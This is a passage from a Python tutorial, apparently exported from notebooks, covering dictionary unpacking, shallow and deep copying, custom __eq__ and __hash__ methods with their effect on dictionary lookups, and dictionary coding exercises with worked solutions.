d2 = {'b': 200, 'd': 4}
d1.update(d2)
print(d1)
```

    {'a': 1, 'b': 200, 'c': 3, 'd': 4}
    

#### Unpacking dictionaries

We can also use unpacking to unpack the contents of one dictionary into the elements of another dictionary. This is very similar to how we can unpack iterables. Let's recall that first:


```
l1 = [1, 2, 3]
l2 = 'abc'
l = (*l1, *l2)
print(l)
```

    (1, 2, 3, 'a', 'b', 'c')
    

We can do something similar with dictionaries:


```
d1 = {'a': 1, 'b': 2}
d2 = {'c': 3, 'd': 4}
d = {**d1, **d2}
print(d)
```

    {'a': 1, 'b': 2, 'c': 3, 'd': 4}
    

Again note how order is preserved.
What happens when there are conflicting keys in the unpacking?


```
d1 = {'a': 1, 'b': 2}
d2 = {'b': 200, 'c': 3}
d = {**d1, **d2}
print(d)
```

    {'a': 1, 'b': 200, 'c': 3}
    

As you can see, the 'last' key/value pair wins.

Now the nice thing about unpacking is that we are not limited to just two dictionaries.

##### Example

In this example we have some dictionaries we use to configure our application.
One dictionary specifies some configuration defaults for every configuration parameter our application will need.
Another dictionary is used to configure some global configuration, and another set of dictionaries is used to define environment specific configurations, maybe dev and prod.


```
conf_defaults = dict.fromkeys(('host', 'port', 'user', 'pwd', 'database'), None)
print(conf_defaults)
```

    {'host': None, 'port': None, 'user': None, 'pwd': None, 'database': None}
    


```
conf_global = {
    'port': 5432,
    'database': 'deepdive'}
```


```
conf_dev = {
    'host': 'localhost',
    'user': 'test',
    'pwd': 'test'
}

conf_prod = {
    'host': 'prodpg.deepdive.com',
    'user': '$prod_user',
    'pwd': '$prod_pwd',
    'database': 'deepdive_prod'
}
```

Now we can generate a full configuration for our dev environment this way:


```
config_dev = {**conf_defaults, **conf_global, **conf_dev}
```


```
print(config_dev)
```

    {'host': 'localhost', 'port': 5432, 'user': 'test', 'pwd': 'test', 'database': 'deepdive'}
    

and a config for our prod environment:


```
config_prod = {**conf_defaults, **conf_global, **conf_prod}
```


```
print(config_prod)
```

    {'host': 'prodpg.deepdive.com', 'port': 5432, 'user': '$prod_user', 'pwd': '$prod_pwd', 'database': 'deepdive_prod'}
    

##### Example

Another way dictionary unpacking can be really useful, is for passing keyword arguments to a function:


```
def my_func(*, kw1, kw2, kw3):
    print(kw1, kw2, kw3)
```


```
d = {'kw2': 20, 'kw3': 30, 'kw1': 10}
```

In this case, we don't really care about the order of the elements, since we'll be unpacking keyword arguments:


```
my_func(**d)
```

    10 20 30
    

Of course we can even use it this way, but here the dictionary order does matter, as it will be reflected in the order in which those arguments are passed to the function:


```
def my_func(**kwargs):
    for k, v in kwargs.items():
        print(k, v)
```


```
my_func(**d)
```

    kw2 20
    kw3 30
    kw1 10
    

As you can see the function's `kwargs` dictionary received the elements in the same order as the original dictionary we unpacked.

#### Copying Dictionaries

We can make copies of dictionaries. But as with iterables, we have to differentiate between **shallow** and **deep** copies.

The `copy` method that dictionaries implement is a shallow copy mechanism.
This means that a new container is created, but the item references within the collection are maintained.

Let's see a simple example:


```
d = {'a': [1, 2], 'b': [3, 4]}
```


```
d1 = d.copy()
```


```
print(d)
print(d1)
```

    {'a': [1, 2], 'b': [3, 4]}
    {'a': [1, 2], 'b': [3, 4]}
    


```
id(d), id(d1), d is d1
```




    (4367368768, 4367467576, False)



So `d` and `d1` are not the same objects, so we can add and remove keys from one dict without affecting the other. Also, we can completely replace an associated value in one without affecting the other.


```
del d['a']
```


```
print(d)
print(d1)
```

    {'b': [3, 4]}
    {'a': [1, 2], 'b': [3, 4]}
    
or even:

```
d['b'] = 100
```


```
print(d)
print(d1)
```

    {'b': 100}
    {'a': [1, 2], 'b': [3, 4]}
    

But let's see what happens if we mutate the value of one dictionary:


```
d = {'a': [1, 2], 'b': [3, 4]}
d1 = d.copy()
print(d)
print(d1)
```

    {'a': [1, 2], 'b': [3, 4]}
    {'a': [1, 2], 'b': [3, 4]}
    


```
d['a'].append(100)
```


```
print(d)
```

    {'a': [1, 2, 100], 'b': [3, 4]}
    


```
print(d1)
```

    {'a': [1, 2, 100], 'b': [3, 4]}
    

As you can see the mutation was also "seen" by `d1`. This is because the objects `d['a']` and `d1['a']` are in fact the **same** objects.


```
d['a'] is d1['a']
```




    True



So if we have nested dictionaries for example, as is often the case with JSON documents, we have to be careful when creating shallow copies.


```
d = {'id': 123445,
    'person': {
        'name': 'John',
        'age': 78},
     'posts': [100, 105, 200]
    }
```


```
d1 = d.copy()
```


```
d1['person']['name'] = 'John Cleese'
d1['posts'].append(300)
```


```
d1
```




    {'id': 123445,
     'person': {'name': 'John Cleese', 'age': 78},
     'posts': [100, 105, 200, 300]}




```
d
```




    {'id': 123445,
     'person': {'name': 'John Cleese', 'age': 78},
     'posts': [100, 105, 200, 300]}



If we want to avoid this issue, we have to create a **deep** copy.
We can easily do this ourselves using recursion, but the `copy` module implements such a function for us:


```
from copy import deepcopy
```


```
d = {'id': 123445,
    'person': {
        'name': 'John',
        'age': 78},
     'posts': [100, 105, 200]
    }
```


```
d1 = deepcopy(d)
```


```
d1['person']['name'] = 'John Cleese'
d1['posts'].append(300)
```


```
d1
```




    {'id': 123445,
     'person': {'name': 'John Cleese', 'age': 78},
     'posts': [100, 105, 200, 300]}




```
d
```




    {'id': 123445, 'person': {'name': 'John', 'age': 78}, 'posts': [100, 105, 200]}



We saw earlier that we can also copy a dictionary by essentially unpacking the keys of one, or more dictionaries, into another.
This also creates a **shallow** copy:


```
d1 = {'a': [1, 2], 'b':[3, 4]}
d = {**d1}
```


```
d
```




    {'a': [1, 2], 'b': [3, 4]}




```
d1['a'].append(100)
```


```
d1
```




    {'a': [1, 2, 100], 'b': [3, 4]}




```
d
```




    {'a': [1, 2, 100], 'b': [3, 4]}



At this point you're probably asking yourself, whether to use `**` or `.copy()` to create a shallow copy. We can even create a shallow of one dict by passing the dict to the `dict()` constructor.

Firstly, the `**` unpacking is more flexible because you can unpack multiple dictionaries into a single new one - `copy` is restricted to copying a single dictionary.

But what about timings? Is one faster than the other?

What about using a dictionary comprehension to copy a dictionary? Is that faster/slower?

Let's try it out and see:


```
from random import randint

big_d = {k: randint(1, 100) for k in range(1_000_000)}
```


```
def copy_unpacking(d):
    d1 = {**d}
    
def copy_copy(d):
    d1 = d.copy()

def copy_create(d):
    d1 = dict(d)
    
def copy_comprehension(d):
    d1 = {k: v for k, v in d.items()}
```


```
from timeit import timeit
```


```
timeit('copy_unpacking(big_d)', globals=globals(), number=100)
```




    2.480969894968439




```
timeit('copy_copy(big_d)', globals=globals(), number=100)
```




    2.469855136005208




```
timeit('copy_create(big_d)', globals=globals(), number=100)
```




    2.4125180219998583




```
timeit('copy_comprehension(big_d)', globals=globals(), number=100)
```




    5.77224236400798



So, creating, unpacking and `.copy()` are about the same - certainly not significant enough to be concerned. A comprehension on the other hand is substantially slower - so, don't use comprehension syntax to do a simple shallow copy!

##  Custom Classes and Hashing

We know that in order for an object to be usable as a key in a dictionary, it must be hashable.
In general Python will not allow mutable types to be hashable. I explained why in previous lectures, but it boils down to key retrieval. 

To retrieve a key/value from a dictionary, we start with the hash of the key, mod (`%`) the size of the dictionary (allocated, not in-use). From that a sequence of search indices is generated (the probe sequence). Python then follows this probe sequence one by one, comparing the requested key with the key at that index, using `==` comparisons (technically it first compares the hasesh themselves, and f they are equal then also compares the keys). If it finds a key which compares equal then it returns that item, otherwise it continues the probe sequence until it either finds the key or sees an empty slot (which means the key does not exist in the dictionary) and bails out of the search.

If we allowed the key to change, then even if it had the same hash (and hence the same probe sequence), Python would not find it unless it still compared equal.

So technically it is not required that the key be immutable, what is required is that the hash and equality of the key does not change!

Remember the difference between equality (`=`) and identity (`is`):


```
t1 = (1, 2, 3)
```


```
t2 = (1, 2, 3)
```


```
t1 is t2
```




    False




```
t1 == t2
```




    True




```
d = {t1: 100}
```


```
d[t1]
```




    100




```
d[t2]
```




    100



As you can see, even though `t1` and `t2` are different **objects**, we can still retrieve the element from the dictionary using either one - because they compare **equal** to each other, and, in fact, **have the same hash** as well:


```
hash(t1), hash(t2)
```




    (2528502973977326415, 2528502973977326415)



One of the basic premises of hashes is that if two objects compare equal, they must have the same hash.

What happens when we create custom objects? Are these hashable?
The answer is yes - but our objects could be mutable, how does Python create a hash for these objects then?
It uses the memory address (`id`) of the object to compute a hash.

Also, by default, different instances of a custom class instances will never compare equal, since by default it compares the memory address.


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
```


```
p1 = Person('John', 78)
p2 = Person('John', 78)
```


```
id(p1), id(p2)
```




    (4359101128, 4359101072)




```
p1 == p2
```




    False




```
hash(p1), hash(p2)
```




    (-9223372036582331988, 272443817)



Because of this default hash calculation, we can actually use custom objects as keys in dictionaries:


```
p1 = Person('John', 78)
p2 = Person('Eric', 75)
persons = {p1: 'John object', p2: 'Eric object'}
```


```
for k in persons.keys():
    print(k)
```

    Person(name=John, age=78)
    Person(name=Eric, age=75)
    

The problem here is that the **only** way to retrieve John for example, is to request the **original** object as the key (since any other instance, even with the same attribute values would not be equal):


```
persons[p1]
```




    'John object'



But we cannot retrieve it this way:


```
p = Person('John', 78)
print(p, id(p))
print(p1, id(p1))
```

    Person(name=John, age=78) 4359141472
    Person(name=John, age=78) 4359139736
    

As you can see they are not the **same** object, they do not compare equal, and their hash is not the same:


```
p == p1, hash(p), hash(p1)
```




    (False, 272446342, -9223372036582329575)



And so:


```
persons.get(p, 'not found')
```




    'not found'



This may not be the behavior we want - we might want to be able to retrieve John from the dictionary as long as the contents (or some of the contents) matches - i.e. when do we consider two Person instances **equal**.

To do this we would start by implementing an `__eq__` method in our class:


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def __eq__(self, other):
        if isinstance(other, Person):
            return self.name == other.name and self.age == other.age
        else:
            return False
```


```
p1 = Person('John', 78)
p2 = Person('John', 78)
```


```
p1 == p2
```




    True



OK, that's great, so let's put `p1` in a dictionary and see if we can recover it using `p2`, which evaluates to equal to `p1`:


```
persons = {p1: 'John p1'}
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-23-9fb6d89f8843> in <module>
    ----> 1 persons = {p1: 'John p1'}
    

    TypeError: unhashable type: 'Person'


Huh? Why is a Person instance suddenly unhashable?


```
hash(p1)
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-25-1d5254fcc026> in <module>
    ----> 1 hash(p1)
    

    TypeError: unhashable type: 'Person'


The only thing we changed is we implemented the `__eq__` method. Let's just check:


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
```


```
hash(Person('John', 78))
```




    272445213




```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def __eq__(self, other):
        if isinstance(other, Person):
            return self.name == other.name and self.age == other.age
        else:
            return False
```


```
hash(Person('John', 78))
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-29-31caaf6017f1> in <module>
    ----> 1 hash(Person('John', 78))
    

    TypeError: unhashable type: 'Person'


Yes, that's the reason... But why?

Remember what I said earlier, if two objects compare equal (`==`) then their hash should also compare equal.

`p1` and `p2` are distinct objects, but they now compare equal, and if their hash was based on their `id` they would not have equal hashes!

When we implement an `__eq__` method on a class, Python will no longer provide a default hash. Instead it automatically indicates that the class is not hashable.

There is a special method `__hash__` which is used by Python when we call the `hash()` function. If that `__hash__` method **is** `None` then Python considers the object unhashable (note I am not saying the `__hash__` function returns `None`, I am saying it should just **be** `None`)


```
hash_func = Person.__hash__
print(hash_func)
```

    None
    

Notice how the __hash__ attribute is `None` - it is not a function that returns `None`.

In fact, we could have done this explicitly ourselves as well:


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def __eq__(self, other):
        if isinstance(other, Person):
            return self.name == other.name and self.age == other.age
        else:
            return False
    
    __hash__ = None
```


```
hash(Person('John', 78))
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-32-31caaf6017f1> in <module>
    ----> 1 hash(Person('John', 78))
    

    TypeError: unhashable type: 'Person'


In fact we can use this technique to mark a custom class, even if it does not implement an `__eq__` method as unhashable:


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    __hash__ = None
```


```
hash(Person('John', 78))
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-34-31caaf6017f1> in <module>
    ----> 1 hash(Person('John', 78))
    

    TypeError: unhashable type: 'Person'


In this case though, we do want Person instances to be hashable so we can recover Person keys in our dictionary based on whether the objects compare equal or not.
In this case we simply want to create a hash based on `name` and `age`. Since both of these values are themselves hashable it turns out to be pretty easy to do:


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def __eq__(self, other):
        if isinstance(other, Person):
            return self.name == other.name and self.age == other.age
        else:
            return False
    
    def __hash__(self):
        print('__hash__ called...')
        return hash((self.name, self.age))
```


```
p1 = Person('John', 78)
p2 = Person('John', 78)
print(id(p1) is id(p2))
print(p1 == p2)
print(hash(p1) == hash(p2))
```

    False
    True
    __hash__ called...
    __hash__ called...
    True
    

As you can see, `Person` objects are now hashable, and equal objects have equal hashes. Of course, if the objects are not equal they usually will have different hashes (though that is not mandatory - we'll come back to that in a bit).


```
p3 = Person('Eric', 75)
```


```
print(p1 == p3)
print(hash(p1) == hash(p3))
```

    False
    __hash__ called...
    __hash__ called...
    False
    

Let's just remove that print statement quick:


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def __eq__(self, other):
        if isinstance(other, Person):
            return self.name == other.name and self.age == other.age
        else:
            return False
    
    def __hash__(self):
        return hash((self.name, self.age))
```

Now let's see how this works with dictionaries:


```
p1 = Person('John', 78)
p2 = Person('John', 78)
p3 = Person('Eric', 75)
```


```
persons = {p1: 'first John object'}
```


```
persons[p1]
```




    'first John object'




```
persons[p2]
```




    'first John object'




```
persons[p3]
```


    ---------------------------------------------------------------------------

    KeyError                                  Traceback (most recent call last)

    <ipython-input-44-cf90355be1b6> in <module>
    ----> 1 persons[p3]
    

    KeyError: Person(name=Eric, age=75)


Now let's try to add `p2` to the dictionary:


```
persons[p2] = 'other (equal) John object'
```


```
persons
```




    {Person(name=John, age=78): 'other (equal) John object'}



As you can see, we actually just overwrote the value of that key - since those two keys are in fact equal (`==`).

So we could not do this:


```
persons = {p1: 'p1', p2: 'p2'}
```


```
persons
```




    {Person(name=John, age=78): 'p2'}



As you can see the key was considered the same, and hence the last value assignment was effective.

But of course we could do this:


```
persons = {p1: 'p1', p3: 'p3'}
```


```
persons
```




    {Person(name=John, age=78): 'p1', Person(name=Eric, age=75): 'p3'}



since `p1` and `p3` are not equal (`==`).

##### A subtle point about ` __hash__` and `hash()`

The `__hash__` method must return an integer - Python will complain otherwise:


```
class Test:
    def __hash__(self):
        return 'a string'
```


```
hash(Test())
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-52-335ee67029c9> in <module>
    ----> 1 hash(Test())
    

    TypeError: __hash__ method should return an integer


Just out of interest:

When we call the `hash()` function, although it in turn calls the `__hash__` method, it does something more.

It will truncate the integer returned by `__hash__` to a certain width which is implementation dependent.

In my case, I can see that hashes will be truncated to 64-bits:


```
import sys
sys.hash_info.width
```




    64



Let's just see how that affects the results of our `__hash__` method:


```
class Test:
    def __hash__(self):
        return 1_000_000_000_000_000_000
```


```
hash(Test())
```




    1000000000000000000




```
class Test:
    def __hash__(self):
        return 10_000_000_000_000_000_000
```


```
hash(Test())
```




    776627963145224196




```
mod = sys.hash_info.modulus
```


```
mod
```




    2305843009213693951




```
10_000_000_000_000_000_000 % mod
```




    776627963145224196



##### Back to equal hashes for unequal objects

As we have seen many times now, hash functions and hashable objects need to satisfy these conditions:
1. if a == b then hash(a) == hash(b)
2. hash(a) must be an integer

But nothing specifies here that unequal objects must result in unequal hashes.

The only issue with equal hashes with unequal objects is that we end up getting more collisions when looking up a key in a dictionary (refer to the earlier theory section if you want more details on this)

So, let's try it out with our `Person` class, we are going to implement a hash that is going to be a constant integer. That will still satisfy conditions (1) and (2) above:


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def __eq__(self, other):
        if isinstance(other, Person):
            return self.name == other.name and self.age == other.age
        else:
            return False
    
    def __hash__(self):
        return 100
```


```
p1 = Person('John', 78)
p2 = Person('Eric', 75)
```


```
hash(p1), hash(p2)
```




    (100, 100)




```
p1 == p2
```




    False




```
persons = {p1: 'p1', p2: 'p2'}
```


```
persons
```




    {Person(name=John, age=78): 'p1', Person(name=Eric, age=75): 'p2'}




```
persons[p1]
```




    'p1'




```
persons[p2]
```




    'p2'




```
persons[Person('John', 78)]
```




    'p1'



As you can see that still works just fine.
But let's see how performance is affected by this.
To test this we are going to create a slightly simpler class:


```
class Number:
    def __init__(self, x):
        self.x = x
        
    def __eq__(self, other):
        if isinstance(other, Number):
            return self.x == other.x
        else:
            return False
    
    def __hash__(self):
        return hash(self.x)        
```


```
class SameHash:
    def __init__(self, x):
        self.x = x
        
    def __eq__(self, other):
        if isinstance(other, SameHash):
            return self.x == other.x
        else:
            return False
    
    def __hash__(self):
        return 100   
```


```
numbers = {Number(i): 'some value' for i in range(1_000)}
same_hashes = {SameHash(i): 'some value' for i in range(1_000)}
```


```
numbers[Number(500)]
```




    'some value'




```
same_hashes[SameHash(500)]
```




    'some value'



And now let's time how long it takes to retrieve an element from each of those dictionaries:


```
from timeit import timeit
```


```
print(timeit('numbers[Number(500)]', globals=globals(), number=10_000))
```

    0.008118819037918001
    


```
print(timeit('same_hashes[SameHash(500)]', globals=globals(), number=10_000))
```

    1.0041481230291538
    

As you can see it takes substantially longer (by a factor of more than 100x) to look up a value when we have hash collisions.
In fact this is the reason why Python has randomized hashes for strings, dates, and a few other built in types. If these hashes were predictable it would be easy for an attacker to purposefully provide keys with the same hash to slow down the system in a denial of service attack.

So, even though that constant value we provide for a hash is technically valid, I wouldn't recommend you use something like it!!

#### Example

Let's take a look at another practical example of where we might want to use custom hashing.

Let's say we want to write a custom class to handle 2D coordinates:


```
class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y
        
    def __repr__(self):
        return f'({self.x}, {self.y})'
```


```
pt = Point(1, 2)
print(pt)
```

    (1, 2)
    

In this case, we actually would like to be able to put these points as keys in a dictionary.
We certainly can as it is:


```
points = {Point(0,0): 'pt 1', Point(1,1): 'pt 2'}
```

But how do we recover the value for the point (0,0) for example?


```
points[Point(0,0)]
```


    ---------------------------------------------------------------------------

    KeyError                                  Traceback (most recent call last)

    <ipython-input-81-b4f2758f9633> in <module>
    ----> 1 points[Point(0,0)]
    

    KeyError: (0, 0)


The problem of course is that Python is using a hash of the id of the points - so we need to implement a custom hash mechanism, and of course also the `__eq__` method (just because the hash of two objects is the same does not mean the objects are also equal, so to look up a key in a dictionary Python needs both a hash and equality).


```
class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y
        
    def __repr__(self):
        return f'({self.x}, {self.y})'
    
    def __eq__(self, other):
        if isinstance(other, Point):
            return self.x == other.x and self.y == other.y
        else:
            return False
        
    def __hash__(self):
        return hash((self.x, self.y))
```


```
points = {Point(0, 0): 'origin', Point(1,1): 'pt at (1,1)'}
```


```
points[Point(0,0)]
```




    'origin'



As you can see we now have the desired functionality.

Let's actually take this a step further, and implement things in such a way that we could use a regular 2-element tuple to look up a point in the dictionary.

To do this we'll have to make sure that `(x, y) == Point(x, y)` and of course make sure that in that case we also have equal hashes - but since we are already calculating the hash of a Point as the hash of the corresponding tuple, we're already fine there.


```
class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y
        
    def __repr__(self):
        return f'({self.x}, {self.y})'
    
    def __eq__(self, other):
        if isinstance(other, tuple) and len(other) == 2:
            other = Point(*other)
        if isinstance(other, Point):
            return self.x == other.x and self.y == other.y
        else:
            return False
        
    def __hash__(self):
        return hash((self.x, self.y))
```


```
points = {Point(0,0): 'origin', Point(1,1): 'pt at (1,1)'}
```


```
points[Point(0,0)]
```




    'origin'




```
points[(0,0)]
```




    'origin'



In fact:


```
(0,0) == Point(0,0)
```




    True



You'll notice that our `Point` class is technically mutable.
So we could do something like this:


```
pt1 = Point(0,0)
pt2 = Point(1,1)
points = {pt1: 'origin', pt2: 'pt at (1,1)'}
```


```
points[pt1], points[Point(0,0)], points[(0,0)]
```




    ('origin', 'origin', 'origin')



But what happens if we mutate `pt1`?


```
pt1.x = 10
```


```
pt1
```




    (10, 0)




```
points[pt1]
```


    ---------------------------------------------------------------------------

    KeyError                                  Traceback (most recent call last)

    <ipython-input-94-d0f59386f0f0> in <module>
    ----> 1 points[pt1]
    

    KeyError: (10, 0)


So we can't recover our item using `pt1`, that's because the hash of `pt1` has changed, so Python start looking in the wrong place in the dictionary.

Let's see what the items are in the dictionary:


```
for k, v in points.items():
    print(k, v)
```

    (10, 0) origin
    (1, 1) pt at (1,1)
    

So can we recover that 'origin' point using a different key maybe?


```
points[Point(10, 0)]
```


    ---------------------------------------------------------------------------

    KeyError                                  Traceback (most recent call last)

    <ipython-input-96-905b9b72ee35> in <module>
    ----> 1 points[Point(10, 0)]
    

    KeyError: (10, 0)


Also not, again because the hash under which the original point `pt1` was stored, is not the same as the new hash for that same object.

This is why we should not use mutable keys in a dictionary!

So, in this case, although we cannot technically enfore immutability, we can use conventions to indicate the object is supposed to be immutable:


```
class Point:
    def __init__(self, x, y):
        self._x = x
        self._y = y
    
    @property
    def x(self):
        return self._x
    
    @property
    def y(self):
        return self._y
    
    def __repr__(self):
        return f'({self.x}, {self.y})'
    
    def __eq__(self, other):
        if isinstance(other, tuple) and len(other) == 2:
            other = Point(*other)
        if isinstance(other, Point):
            return self.x == other.x and self.y == other.y
        else:
            return False
        
    def __hash__(self):
        return hash((self.x, self.y))
```

Everything works just as before, but making the underlying attributes `_x` and `_y` indicates these are private and should not be modified directly.
Furthermore we only created attribute getters, not setters for `x` and `y`:


```
pt = Point(0,0)
```


```
pt.x
```




    0




```
pt.x = 10
```


    ---------------------------------------------------------------------------

    AttributeError                            Traceback (most recent call last)

    <ipython-input-100-634eaafb5eab> in <module>
    ----> 1 pt.x = 10
    

    AttributeError: can't set attribute


# Section 04 - Coding Exercises

##  Coding Exercises

#### Exercise 1

Write a Python function that will create and return a dictionary from another dictionary, but sorted by value. You can assume the values are all comparable and have a natural sort order.

For example, given the following dictionary:


```
composers = {'Johann': 65, 'Ludwig': 56, 'Frederic': 39, 'Wolfgang': 35}
```

Your function should return a dictionary that looks like the following:


```
sorted_composers = {'Wolfgang': 35,
                    'Frederic': 39, 
                    'Ludwig': 56,
                    'Johann': 65}
```

Remember if you are using Jupyter notebook to use `print()` to view your dictionary in it's natural ordering (in case Jupyter displays your dictionary sorted by key).

Also try to keep your code Pythonic - i.e. don't start with an empty dictionary and build it up one key at a time - look for a different, more Pythonic, way of doing it. 

Hint: you'll likely want to use Python's `sorted` function.

---

#### Exercise 2

Given two dictionaries, `d1` and `d2`, write a function that creates a dictionary that contains only the keys common to both dictionaries, with values being a tuple containg the values from `d1` and `d2`. (Order of keys is not important).

For example, given two dictionaries as follows:


```
d1 = {'a': 1, 'b': 2, 'c': 3, 'd': 4}
d2 = {'b': 20, 'c': 30, 'y': 40, 'z': 50}
```

Your function should return a dictionary that looks like this:


```
d = {'b': (2, 20), 'c': (3, 30)}
```

Hint: Remember that `s1 & s2` will return the intersection of two sets.

Again, try to keep your code Pythonic - don't just start with an empty dictionary and build it up one by one - think of a cleaner approach.

---

#### Exercise 3

You have text data spread across multiple servers.
Each server is able to analyze this data and return a dictionary that contains words and their frequency.

Your job is to combine this data to create a single dictionary that contains all the words and their combined frequencies from all these data sources. Bonus points if you can make your dictionary sorted by frequency (highest to lowest).

For example, you may have three servers that each return these dictionaries:


```
d1 = {'python': 10, 'java': 3, 'c#': 8, 'javascript': 15}
d2 = {'java': 10, 'c++': 10, 'c#': 4, 'go': 9, 'python': 6}
d3 = {'erlang': 5, 'haskell': 2, 'python': 1, 'pascal': 1}
```

Your resulting dictionary should look like this:


```
d = {'python': 17,
     'javascript': 15,
     'java': 13,
     'c#': 12,
     'c++': 10,
     'go': 9,
     'erlang': 5,
     'haskell': 2,
     'pascal': 1}
```

If only servers 1 and 2 return data (so d1 and d2), your results would look like:


```
d = {'python': 16,
     'javascript': 15,
     'java': 13,
     'c#': 12,
     'c++': 10, 
     'go': 9}
```

---

#### Exercise 4

For this exercise suppose you have a web API load balanced across multiple nodes. This API receives various requests for resources and logs each request to some local storage. Each instance of the API is able to return a dictionary containing the resource that was accessed (the dictionary key) and the number of times it was requested (the associated value).

Your task here is to identify resources that have been requested on some, but not all the servers, so you can determine if you have an issue with your load balancer not distributing certain resource requests across all nodes.

For simplicity, we will assume that there are exactly 3 nodes in the cluster.

You should write a function that takes 3 dictionaries as arguments for node 1, node 2, and node 3, and returns a dictionary that contains only keys that are not found in **all** of the dictionaries. The value should be a list containing the number of times it was requested in each node (the node order should match the dictionary (node) order passed to your function). Use `0` if the resource was not requested from the corresponding node.

Suppose your dictionaries are for logs of all the GET requests on each node:


```
n1 = {'employees': 100, 'employee': 5000, 'users': 10, 'user': 100}
n2 = {'employees': 250, 'users': 23, 'user': 230}
n3 = {'employees': 150, 'users': 4, 'login': 1000}
```

Your result should then be:


```
result = {'employee': (5000, 0, 0),
          'user': (100, 230, 0),
          'login': (0, 0, 1000)}
```

Tip: 
to find the difference between two sets, you can subtract one from the other:


```
s1 = {1, 2, 3, 4}
s2 = {1, 2, 3}
s1 - s2
```




    {4}



Tip: to get the union of two (or more) sets you can use the `|` operator:


```
s1 = {1, 2, 3}
s2 = {2, 3, 4}
s1 | s2
```




    {1, 2, 3, 4}



Tip: to get the intersection of two (or more) sets you can use the `&` operator:


```
s1 = {1, 2, 3, 4}
s2 = {2, 3}
s1 & s2
```




    {2, 3}



Hint: It might be helpful to draw out a set diagram and consider what subset you are trying to isolate.

##  Coding Exercises - Solution 1

#### Exercise 1

Write a Python function that will create and return a dictionary from another dictionary, but sorted by value. You can assume the values are all comparable and have a natural sort order.

For example, given the following dictionary:


```
composers = {'Johann': 65, 'Ludwig': 56, 'Frederic': 39, 'Wolfgang': 35}
```

Your function should return a dictionary that looks like the following:


```
sorted_composers = {'Wolfgang': 35,
                    'Frederic': 39, 
                    'Ludwig': 56,
                    'Johann': 65}
```

Remember if you are using Jupyter notebook to use `print()` to view your dictionary in it's natural ordering (Jupyter will display your dictionary sorted by key).

Also try to keep your code Pythonic - i.e. don't start with an empty dictionary and build it up one key at a time - look for a different, more Pythonic, way of doing it. 

Hint: you'll likely want to use Python's `sorted` function.

##### Solution

My approach here is to sort the `items()` view using Python's `sorted` function and a custom `key` that uses the dictionary values (or second element of each tuple in the `items` view):


```
composers = {'Johann': 65, 'Ludwig': 56, 'Frederic': 39, 'Wolfgang': 35}

def sort_dict_by_value(d):
    d = {k: v
        for k, v in sorted(d.items(), key=lambda el: el[1])}
    return d
```


```
print(sort_dict_by_value(composers))
```

    {'Wolfgang': 35, 'Frederic': 39, 'Ludwig': 56, 'Johann': 65}
    

Here's a better approach - instead of using a dictionary comprehension, we can simply use the `dict()` function to create a dictionary from the sorted tuples!


```
def sort_dict_by_value(d):
    return dict(sorted(d.items(), key=lambda el: el[1]))
```

And we end up with the same end result:


```
sort_dict_by_value(composers)
```




    {'Wolfgang': 35, 'Frederic': 39, 'Ludwig': 56, 'Johann': 65}



##  Coding Exercises - Solution 2

#### Exercise 2

Given two dictionaries, `d1` and `d2`, write a function that creates a dictionary that contains only the keys common to both dictionaries, with values being a tuple containg the values from `d1` and `d2`. (Order of keys is not important).

For example, given two dictionaries as follows:


```
d1 = {'a': 1, 'b': 2, 'c': 3, 'd': 4}
d2 = {'b': 20, 'c': 30, 'y': 40, 'z': 50}
```

Your function should return a dictionary that looks like this:


```
d = {'b': (2, 20), 'c': (3, 30)}
```

Hint: Remember that `s1 & s2` will return the intersection of two sets.

Again, try to keep your code Pythonic - don't just start with an empty dictionary and build it up one by one - think of a cleaner approach.

##### Solution

My approach here is to use set intersections to find the keys common to both dictionaries.
Then I use a dictionary comprehension to build up my new dictionary, making each value in the new dictionary a tuple containing the values from the original dictionaries:


```
d1 = {'a': 1, 'b': 2, 'c': 3, 'd': 4}
d2 = {'b': 20, 'c': 30, 'y': 40, 'z': 50}

def intersect(d1, d2):
    d1_keys = d1.keys()
    d2_keys = d2.keys()
    keys = d1_keys & d2_keys
    d = {k: (d1[k], d2[k]) for k in keys}
    return d
```


```
intersect(d1, d2)
```




    {'b': (2, 20), 'c': (3, 30)}



##  Coding Exercises - Solution 3

#### Exercise 3
You have text data spread across multiple servers.
Each server is able to analyze this data and return a dictionary that contains words and their frequency.

Your job is to combine this data to create a single dictionary that contains all the words and their combined frequencies from all these data sources. Bonus points if you can make your dictionary sorted by frequency (highest to lowest).

For example, you may have three servers that each return these dictionaries:

```
d1 = {'python': 10, 'java': 3, 'c#': 8, 'javascript': 15}
d2 = {'java': 10, 'c++': 10, 'c#': 4, 'go': 9, 'python': 6}
d3 = {'erlang': 5, 'haskell': 2, 'python': 1, 'pascal': 1}
```

Your resulting dictionary should look like this:


```
